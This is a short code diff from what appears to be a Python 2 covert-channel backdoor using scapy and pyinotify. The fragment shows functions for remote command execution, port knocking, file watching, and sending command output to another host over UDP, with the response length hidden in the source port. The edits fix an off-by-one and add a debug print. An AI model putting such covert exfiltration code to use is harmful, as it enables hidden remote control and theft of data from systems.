@@ -184,7 +184,7 @@ def remoteExecute(packet):
                     knock(new_dest)
 
                     # Send length of response
-                    send(IP(dst=new_dest) / UDP(sport=len(lines), dport=SEND_PORT), verbose=0)
+                    send(IP(dst=new_dest) / UDP(sport=(len(lines)-1), dport=SEND_PORT), verbose=0)
 
                     # Send data
                     for i in range(0, len(lines) - 1):
@@ -425,6 +425,8 @@ def fileMonitor(watch, q):
             if x == 'watch':
                 print 'Adding:', y
                 monitor_list[y] = wm.add_watch(y, MASK, rec=True, auto_add=True)
+                for i in monitor_list.items():
+                    print i
             elif x == 'twatch':
                 print 'Adding transient watch:', y
                 monitor_list[y] = wm.watch_transient_file(y, pyinotify.IN_MODIFY, EventHandler)
